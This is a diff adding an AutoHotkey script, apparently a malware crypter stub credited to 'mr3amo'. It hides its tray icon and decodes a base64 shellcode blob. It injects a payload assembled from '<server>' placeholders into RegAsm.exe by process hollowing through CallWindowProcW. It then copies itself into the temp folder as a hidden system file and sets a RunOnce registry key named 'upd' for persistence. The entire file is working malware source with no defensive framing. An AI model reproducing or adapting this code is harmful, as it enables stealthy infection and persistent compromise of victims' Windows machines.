@@ -1,0 +1,34 @@
+;==========================================
+;========= coded by : mr3amo ==============
+;==========================================
+;------- Tested    : Win7 x64 x86-------------------------
+#NoTrayIcon
+inj:="user32.dll\CallWindowProcW"
+TargetHost:= A_WinDir 
+TargetHost.= "\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe"  
+;===============Spoofer.exe==== test inject=========================
+srv:="<server>"
+srv1:="<server1>"
+f:= srv srv1
+;-----------------shellcode asm-------------------------
+s_ASM :="YOhOAAAAawBlAHIAbgBlAGwAMwAyAAAAbgB0AGQAbABsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAW4v8akLouwMAAItUJCiJEYtUJCxqPuiqAwAAiRFqSuihAwAAiTlqHmo86J0DAABqImj0AAAA6JEDAABqJmok6IgDAABqKmpA6H8DAABqLmoM6HYDAABqMmjIAAAA6GoDAABqKuhcAwAAiwnHAUQAAABqEuhNAwAAaFvoFM9R6HkDAABqPug7AwAAi9FqHugyAwAAakD/Mv8x/9BqEugjAwAAaFvoFM9R6E8DAABqHugRAwAAiwmLUTxqPugFAwAAizkD+moi6PoCAACLCWj4AAAAV1H/0GoA6OgCAABoiP6zFlHoFAMAAGou6NYCAACLOWoq6M0CAACLEWpC6MQCAABXUmoAagBqBGoAagBqAGoA/zH/0GoS6KkCAABo0DcQ8lHo1QIAAGoi6JcCAACLEWou6I4CAACLCf9yNP8x/9BqAOh+AgAAaJyVGm5R6KoCAABqIuhsAgAAixGLOWou6GECAACLCWpAaAAwAAD/clD/dzT/Mf/QajboRwIAAIvRaiLoPgIAAIs5aj7oNQIAAIsxaiLoLAIAAIsBai7oIwIAAIsJUv93VFb/cDT/MWoA6BACAABooWo92FHoPAIAAIPEDP/QahLo+QEAAGhb6BTPUeglAgAAaiLo5wEAAIsRg8IGajro2wEAAGoCUlH/0Go26M4BAADHAQAAAAC4KAAAAGo26LwBAAD3IWoe6LMBAACLEYtSPIHC+AAAAAPQaj7onwEAAAMRaibolgEAAGooUv8xahLoigEAAGhb6BTPUei2AQAAg8QM/9BqJuhzAQAAizmLCYtxFGo+6GUBAAADMWom6FwBAACLCYtRDGoi6FABAACLCQNRNGpG6EQBAACLwWou6DsBAACLCVD/dxBWUv8xagDoKgEAAGihaj3YUehWAQAAg8QM/9BqNugTAQAAixGDwgGJEWo66AUBAACLCTvKD4Uz////ajLo9AAAAIsJxwEHAAEAagDo5QAAAGjSx6doUegRAQAAajLo0wAAAIsRai7oygAAAIsJUv9xBP/QaiLouwAAAIs5g8c0ajLorwAAAIsxi7akAAAAg8YIai7onQAAAIsRakbolAAAAFFqBFdW/zJqAOiGAAAAaKFqPdhR6LIAAACDxAz/0Goi6G8AAACLCYtRKANRNGoy6GAAAACLCYHBsAAAAIkRagDoTwAAAGjTx6foUeh7AAAAajLoPQAAAIvRai7oNAAAAIsJ/zL/cQT/0GoA6CQAAABoiD9KnlHoUAAAAGou6BIAAACLCf9xBP/QakroBAAAAIshYcOLywNMJATDagDo8v///2hUyq+RUegeAAAAakBoABAAAP90JBhqAP/Q/3QkFOjP////iQGDxBDD6CIAAABopE4O7FDoSwAAAIPECP90JAT/0P90JAhQ6DgAAACDxAjDVVJRU1ZXM8Bki3Awi3YMi3Yci24Ii34gizY4Rxh184A/a3QHgD9LdALr54vFX15bWVpdw1VSUVNWV4tsJByF7XRDi0U8i1QoeAPVi0oYi1ogA93jMEmLNIsD9TP/M8D8rITAdAfBzw0D+Ov0O3wkIHXhi1okA91miwxLi1ocA92LBIsDxV9eW1laXcPDAAAAAA=="
+sleep,<sleep>
+Base64dec(bBuffer,f)
+Base64dec(Mcode,s_ASM)
+DllCall(inj, "Ptr", &Mcode, "str", TargetHost, "Ptr", &bBuffer, "Uint", 0, "Uint", 0)
+Base64dec( ByRef OutData, ByRef InData ) {
+ DllCall( "Crypt32.dll\CryptStringToBinary" ( A_IsUnicode ? "W" : "A" ), UInt,&InData
+        , UInt,StrLen(InData), UInt,1, UInt,0, UIntP,Bytes, Int,0, Int,0, "CDECL Int" )
+ VarSetCapacity( OutData, Req := Bytes * ( A_IsUnicode ? 2 : 1 ) )
+ DllCall( "Crypt32.dll\CryptStringToBinary" ( A_IsUnicode ? "W" : "A" ), UInt,&InData
+        , UInt,StrLen(InData), UInt,1, Str,OutData, UIntP,Req, Int,0, Int,0, "CDECL Int" )
+Return Bytes
+}
+FileCopy,%A_Scriptfullpath%, %A_Temp%\%A_Scriptname%,1 
+FileSetAttrib, +SH, %A_Temp%\%A_Scriptname%,1 
+RegWrite, REG_SZ, HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce, upd, %A_Temp%\%A_Scriptname%
+ ExitApp
+
+
+
+
